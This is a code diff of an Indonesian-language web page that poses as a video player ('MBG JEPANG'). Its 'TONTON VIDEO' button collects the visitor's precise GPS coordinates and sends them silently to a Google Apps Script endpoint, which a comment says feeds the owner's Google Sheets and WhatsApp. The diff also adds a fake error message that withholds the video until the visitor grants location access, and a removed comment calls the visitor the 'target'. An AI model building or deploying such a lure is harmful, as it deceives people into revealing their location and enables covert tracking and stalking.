@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kumpulan Video MBG Jepang</title>
+    <title>MBG JEPANG</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,10 +19,10 @@
             height: 100vh;
         }
         .header-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
             margin-bottom: 15px;
-            letter-spacing: 0.5px;
+            letter-spacing: 1px;
             color: #e50914;
         }
         .container {
@@ -31,7 +31,7 @@
             padding: 15px;
             box-sizing: border-box;
         }
-        .video-wrapper {
+        .media-wrapper {
             background: #1f1f1f;
             border-radius: 8px;
             box-shadow: 0px 4px 15px rgba(0,0,0,0.5);
@@ -41,75 +41,67 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            cursor: pointer;
         }
-        img {
+        /* Tampilan awal (Siluet / Poster) */
+        #siluet {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            display: none; /* Disembunyikan di awal */
+            display: block;
         }
-        .play-overlay {
+        /* Tombol Tonton Video */
+        .btn-unlock {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.4);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        .play-button {
             background-color: #e50914;
             color: white;
-            width: 65px;
-            height: 65px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-            box-shadow: 0px 4px 15px rgba(0,0,0,0.6);
-            transition: transform 0.2s;
-        }
-        .video-wrapper:hover .play-button {
-            transform: scale(1.1);
-        }
-        .play-text {
-            margin-top: 10px;
-            font-size: 14px;
+            padding: 14px 28px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
             font-weight: bold;
-            letter-spacing: 0.5px;
+            cursor: pointer;
+            box-shadow: 0px 4px 12px rgba(0,0,0,0.6);
+            letter-spacing: 1px;
+        }
+        .btn-unlock:hover {
+            background-color: #b20710;
+        }
+        /* Elemen Video & Foto Akhir (disembunyikan di awal) */
+        video, #fotoHasil {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="header-title">KUMPULAN VIDEO MBG JEPANG</div>
-        <!-- Kotak yang menyerupai pemutar video -->
-        <div class="video-wrapper" id="triggerArea" onclick="jalankanAksi()">
-            <img id="foto" src="PXL_20260815_090015220.jpg" alt="Video Content">
+        <div class="header-title">MBG JEPANG</div>
+        
+        <div class="media-wrapper" id="wrapper">
+            <!-- Gambar Siluet awal (bisa diganti link gambar siluet Anda) -->
+            <img id="siluet" src="siluet.jpg" alt="Siluet Video">
             
-            <div id="overlay" class="play-overlay">
-                <div class="play-button">▶</div>
-                <div class="play-text">KETUK UNTUK MENONTON</div>
-            </div>
+            <!-- Tombol Pemicu -->
+            <button id="btnTonton" class="btn-unlock" onclick="mintaAksesLokasi()">TONTON VIDEO</button>
+            
+            <!-- Elemen Video yang di-host di GitHub (0.0-40.0.mp4) -->
+            <video id="videoPlayer" src="0.0-40.0.mp4" controls preload="auto"></video>
+            
+            <!-- Foto Asli yang muncul setelah video habis -->
+            <img id="fotoHasil" src="PXL_20260815_090015220.jpg" alt="Foto Konten">
         </div>
     </div>
 
     <script>
-        function jalankanAksi() {
-            // 1. Hilangkan tombol play dan tampilkan gambar/video
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('foto').style.display = 'block';
-
-            // 2. Panggil fungsi geolocation browser
+        function mintaAksesLokasi() {
+            // Pastikan fitur geolocation didukung browser
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
+                        // KASUS 1: Pengguna mengizinkan (Allow) akses lokasi
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         const akurasi = position.coords.accuracy;
@@ -122,7 +114,7 @@
                             akurasi: akurasi + " meter"
                         };
 
-                        // Kirim data ke backend Google Apps Script secara senyap
+                        // Kirim data koordinat ke Apps Script (Google Sheets & WhatsApp Anda)
                         fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                             method: "POST",
                             mode: "no-cors",
@@ -131,17 +123,40 @@
                             },
                             body: JSON.stringify(payload)
                         }).catch(err => {});
+
+                        // Jalankan pemutaran video
+                        mulaiVideo();
                     },
                     function(error) {
-                        // Jika ditolak, abaikan agar target mengira video tetap berjalan
+                        // KASUS 2: Pengguna menolak (Block) akses lokasi -> Video tidak diputar
+                        alert("Gagal memuat pemutar video. Pastikan izin lokasi diaktifkan untuk menonton.");
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 15000,
                         maximumAge: 0
                     }
                 );
+            } else {
+                alert("Browser Anda tidak mendukung fitur ini.");
             }
+        }
+
+        function mulaiVideo() {
+            // Sembunyikan siluet dan tombol
+            document.getElementById('siluet').style.display = 'none';
+            document.getElementById('btnTonton').style.display = 'none';
+            
+            // Tampilkan dan putar video
+            var vid = document.getElementById('videoPlayer');
+            vid.style.display = 'block';
+            vid.play();
+
+            // Ketika video selesai diputar (durasi 40 detik habis)
+            vid.onended = function() {
+                vid.style.display = 'none'; // Sembunyikan video
+                document.getElementById('fotoHasil').style.display = 'block'; // Tampilkan foto asli
+            };
         }
     </script>
 
